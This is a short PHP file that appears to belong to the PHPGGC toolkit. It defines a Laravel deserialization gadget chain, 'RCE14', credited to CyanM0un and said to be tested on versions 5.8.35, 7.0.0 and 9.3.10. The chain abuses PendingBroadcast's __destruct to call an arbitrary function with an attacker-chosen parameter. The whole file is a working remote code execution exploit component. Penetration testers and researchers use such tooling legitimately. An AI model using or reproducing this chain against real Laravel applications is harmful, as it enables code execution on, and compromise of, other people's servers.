<?php

namespace GadgetChain\Laravel;

class RCE14 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = 'test on 5.8.35, 7.0.0, 9.3.10';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $param = $parameters['parameter'];

        return new \Illuminate\Broadcasting\PendingBroadcast($function,$param);
    }
}
